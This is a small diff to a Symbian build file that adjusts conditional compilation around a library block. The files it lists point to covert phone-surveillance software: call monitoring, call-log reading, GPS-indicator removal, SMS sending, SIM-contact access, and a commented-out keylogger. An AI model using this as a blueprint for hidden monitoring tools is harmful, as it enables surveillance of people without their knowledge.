@@ -25,9 +25,7 @@ SOURCE JsonTokener.cpp JsonUtil.cpp JsonValue.cpp StringUtil.cpp
 SOURCEPATH                              ..\src 
 SOURCE TonePlayer.cpp
 SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp SlimMonitorPhoneCall.cpp MonitorFreeSpace.cpp MonitorForeground.cpp GpsIndicatorRemover.cpp CallLogReader.cpp MonitorCrisis.cpp//KeyLogger.cpp
-#ifdef SYMBIAN_ENABLE_SPLIT_HEADERS         // for Symbian^3 only
 SOURCE MonitorMPStore.cpp
-#endif 
 SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
 SOURCE ActionEvent.cpp ActionAgent.cpp
 SOURCE StateCmdUninstall.cpp StateNone.cpp StateNewConfFeedback.cpp
@@ -95,9 +93,9 @@ LIBRARY mediaclientaudio.lib				// for tone generation
 LIBRARY coreproviders.lib					// for connection notes into Symbian^3
 LIBRARY extendedconnpref.lib                // for connection notes into Symbian^3
 LIBRARY netmeta.lib
+#endif
 LIBRARY etel.lib							// for SIM contacts - access to phone store
 LIBRARY etelmm.lib							// for SIM contacts - access to phone store
-#endif 
 
 LIBRARY ezip.lib charconv.lib apmime.lib cryptography.lib imcm.lib hash.lib
 LIBRARY SharedQueueCli_20023633.lib 
